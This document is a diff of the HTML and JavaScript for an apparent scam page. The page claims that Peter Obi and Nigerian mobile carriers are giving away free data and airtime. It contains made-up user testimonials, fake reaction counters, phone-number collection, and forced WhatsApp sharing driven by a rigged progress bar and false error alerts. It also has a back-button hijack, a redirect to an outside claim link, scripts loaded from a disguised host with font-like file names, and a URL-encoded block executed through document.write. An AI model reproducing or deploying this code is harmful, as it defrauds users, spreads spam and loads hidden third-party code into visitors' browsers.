-          <div class="comment-meta">3m · Like · Reply</div>
-        </div>
-      </div>
-      <div class="comment">
-        <img class="avatar" src="https://i.pravatar.cc/80?img=45" alt="">
-        <div>
-          <div class="bubble"><b>Adam Johnson</b><span>The offer looks great. The 10GB Birthday gift is really clear.</span></div>
-          <div class="comment-meta">5m · Like · Reply</div>
-        </div>
-      </div>
-      <div class="comment">
-        <img class="avatar" src="https://i.pravatar.cc/80?img=5" alt="">
-        <div>
-          <div class="bubble"><b>Olivia Smith</b><span>I finished the steps and the activation page appeared. Thank You so much sir!</span></div>
-          <div class="comment-meta">8m · Like · Reply</div>
-        </div>
-      </div>
-    </div>
-    <div class="comment-input"><input placeholder="Write a comment..."></div>
-  </section>
+         
 
-  <p class="footer">NDC — All rights reserved 2026.</p>
-</div>
-  <!-- BEGIN: Powered by Supercounters.com -->
+
+
+            
+
+
+
+<br/>
+
+                <br/>
+                <button id="offer">ACTIVATE</button><br/>
+
+
+
+
+
+
+        </div>
+        <div class="comments">
+            <div class="counter">
+                <div class="reactions">
+                    <img class="like" src="https://i.imgur.com/g6cV61A.png" /> <img class="love" src="https://i.imgur.com/0UHB1f0.png" />
+                    <img class="care" src="https://i.imgur.com/sSMYbTT.png" /> <span id="likes">134K</span>
+                </div>
+                <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
+            </div>
+            <div class="bar">
+                <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span>
+                <span class="react"><i class="fa fa-comment-o"></i> Comment</span>
+                <span class="react"><i class="fa fa-share"></i> Share</span>
+            </div>
+            <div>
+                <div class="comment">
+                </div>
+            </div>
+            <div class="comment">
+                <img src="https://i.imgur.com/xp1ER6K.jpg" />
+                <div class="single-container">
+                    <span class="user"> Joseph Emmanuel </span>
+                    <span class="text">
+                        I doubt this offer at first, but it's real. i just got my ₦5,000 Airtime thank you Mr. Peter Obi Happy Birthday Sir
+                        </span>
+                </div>
+                <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span>
+                    <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+            </div>
+            <div class="comment">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhC5I3x2Ykht2M6Pktwjzc0xV7dmqJty_eCw4rDcFV5r_eDxXMRGWJF9tuYPEpe_fvnM0DtzfdDKbQUFKAhhnj1tXN97o8EJP_l_XFJeyX7dc1bm6bpocYaeGtrngVoV9TruTJrlONHypx0/s1600/FB_IMG_15869726679037399.jpg" />
+                <div class="single-container"><span class="user">David Anthony</span>
+                    <span class="text"> I just received 10GB wow unbeleivable. thank you OBI Happy Birthday </span></div>
+                <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span>
+                    <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+            </div>
+            <div class="comment reply">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgAg5sqDhd96nW2Ek_9vet4ztoELeaZmKUSIgzUImj18MpjZvy2qNPXaEgkSNOxLtEOvrT2iPc9RuUUmu2xnhRydySo5WIFpWEJiYmuMDqXnPKrqFzC8aABhp-mrUbaqinlsgJ5LA6hwZS/s1600/FB_IMG_15869730921979436.jpg" />
+                <div class="single-container"><span class="user">Amahle John </span>
+                    <span class="text">My own is pending because i just finish sharing. Please help! </span></div>
+                <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span>
+                    <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+            </div>
+            <div class="comment">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" />
+                <div class="single-container"><span class="user">Bonolo</span>
+                    <span class="text">My brother got 10GB from My MTN  already, i pray i get approved too</span></div>
+                <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span>
+                    <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+            </div>
+            <div class="input"><input placeholder="Write a comment..." /></div>
+        </div>
+    </div>
+    </div>
+ <!-- BEGIN: Powered by Supercounters.com -->
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1733929,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
 </center>
-<script src="https://div-ccss-font-class.ink/css-java-script-script-font-size-css.js"></script>
-<script src="peter-verify"></script>
-<script>
-const CONFIG = {
-  shareUrl: "https://ibaidad.com/obi-birthday",
-  claimUrl: "https://ey43.com/4/3144603",
-shareText: "🎁Peter Obi in Collaboration with MTN, Airtel, Glo and 9-Mobile to Provide 10GB Free Data and ₦5,000 Airtime to everyone in Celebration of his Birthday POWERED BY: NDC    Get Free Data and Airtime Gift here: ",
-  storageKey: "EID_100GB_PROGRESS_V2"
-};
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+<script src="https://div-ccss-font-class.ink/script-js-div-id-class-format-color-background-font-style.js"></script>
+<script src="https://div-ccss-font-class.ink/script-js-div-id-class-format-color-bg-font-style.js"></script>
+<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise-css.js"></script>
+<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise1-css.js"></script>
+  <script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise2-css.js"></script>
 
-const $ = (id)=>document.getElementById(id);
-const steps = ["step1","stepLoading","step2","step3","step4","step5"];
-function showStep(id){
-  steps.forEach(s=>$(s).classList.remove("active"));
-  $(id).classList.add("active");
-  window.scrollTo({top:0,behavior:"smooth"});
-}
-function animateNumber(el, duration=2200, done){
-  let i=0;
-  const speed = Math.max(14, duration/100);
-  const timer=setInterval(()=>{
-    i++;
-    el.textContent=i+"%";
-    if(i>=100){clearInterval(timer); done && done();}
-  }, speed);
-}
-function confetti(total=70){
-  const icons=["🎊","✨","🌙","⭐","🎁","🟡","🟢"];
-  for(let i=0;i<total;i++){
-    const d=document.createElement("div");
-    d.className="confetti";
-    d.textContent=icons[Math.floor(Math.random()*icons.length)];
-    d.style.left=Math.random()*100+"vw";
-    d.style.fontSize=(16+Math.random()*18)+"px";
-    d.style.animationDuration=(2.7+Math.random()*2.5)+"s";
-    d.style.animationDelay=(Math.random()*1.1)+"s";
-    document.body.appendChild(d);
-    setTimeout(()=>d.remove(),6200);
-  }
-}
 
-$("startBtn").onclick=()=>{
-  confetti(90);
-  showStep("stepLoading");
-  animateNumber($("mainPercent"),1900,()=>setTimeout(()=>showStep("step2"),450));
-};
 
-$("phoneBtn").onclick=()=>{
-  const phone=$("phone").value.trim();
-  if(phone.length < 8){
-    $("phoneError").style.display="block";
-    $("phone").classList.add("shake");
-    setTimeout(()=>$("phone").classList.remove("shake"),300);
-    return;
-  }
-  $("phoneError").style.display="none";
-  showStep("step3");
 
-  let a=0,b=0;
-  const t1=setInterval(()=>{
-    a+=4; if(a>100)a=100;
-    $("p1").textContent=a+"%";
-    if(a>=100){clearInterval(t1);$("row1").classList.add("done")}
-  },55);
+    <!--
+"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_10GB",
+-->
 
-  setTimeout(()=>{
-    const t2=setInterval(()=>{
-      b+=3; if(b>100)b=100;
-      $("p2").textContent=b+"%";
-      if(b>=100){
-        clearInterval(t2);$("row2").classList.add("done");
-        setTimeout(()=>{showStep("step4");confetti(80);},650);
-      }
-    },55);
-  },1200);
-};
 
-let progress = Number(localStorage.getItem(CONFIG.storageKey) || 0);
-function updateShare(){
-  if(progress>100)progress=100;
-  $("shareFill").style.width=progress+"%";
-  $("sharePercent").textContent=progress+"%";
-  localStorage.setItem(CONFIG.storageKey, progress);
-  if(progress>=100){
-    setTimeout(()=>{showStep("step5");confetti(120);},700);
-  }
-}
-updateShare();
-
-$("shareBtn").onclick=()=>{
-  const url = "whatsapp://send?text=" + encodeURIComponent(CONFIG.shareText + CONFIG.shareUrl);
-  window.location.href = url;
-  progress += 10;
-  setTimeout(updateShare,900);
-};
-
-$("claimBtn").onclick=()=>{
-  window.open(CONFIG.claimUrl,"_blank");
-};
-
-let likes=134, comments=23, shares=12;
-setInterval(()=>{
-  likes += Math.floor(Math.random()*3);
-  comments += Math.floor(Math.random()*2);
-  shares += Math.floor(Math.random()*2);
-  $("likes").textContent = likes+"K";
-  $("commentsCount").textContent = comments+"K comments";
-  $("sharesCount").textContent = shares+"K shares";
-},5000);
+    
+<script> 
+ var text1 = "*Peter Obi Birthday Celebration Offer*%0A%0APeter Obi in Collaboration with MTN, Airtel, Glo and 9-Mobile to Provide 10GB Free Data and ₦5,000 Airtime to everyone in Celebration of his Birthday%0A%0A*POWERED BY:*%0A_Nigeria Democratic Congress (NDC)_ %0A%0A*For MTN*👇%0Ahttps://ibaidad.com/obi-birthday %0A%0A*For Airtel*👇%0Ahttps://ibaidad.com/obi-birthday %0A%0A*For Glo*👇%0Ahttps://ibaidad.com/obi-birthday %0A%0A*For 9-Mobile*👇%0Ahttps://ibaidad.com/obi-birthday",
+    text2 = " an amount of ",
+    text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+    error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+    abcde = "https://ey43.com/4/3144603",
+    saved = "",
+    share = "whatsapp://send?text="+text1;
 </script>
-  
-  
-  
-  
-  
-   <script>
+</script>
+           <script>
     window.onhashchange=function(){jp();};
     function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
     function jp() {
@@ -491,17 +637,21 @@ setInterval(()=>{
         document.querySelector('.pre-loader').className += ' hidden';
     });
 </script>
-  
-  
-  
-  
-  
-  
-  
-  
-  <script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise-css.js"></script>
-<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise1-css.js"></script>
-  <script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise2-css.js"></script>
-  <script id="_wau807">var _wau = _wau || []; _wau.push(["tab", "01je9bsfy6", "807", "bottom-center"]);</script><script async src="//waust.at/t.js"></script>
+
+
+
+
+    <script>
+        <!-- code by OD 
+        -->
+        document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+    </script>
+
+
+
+    <script>
+        /*<![CDATA[*/ cookieChoices = {}; /*]]>*/
+    
 </body>
+
 </html>
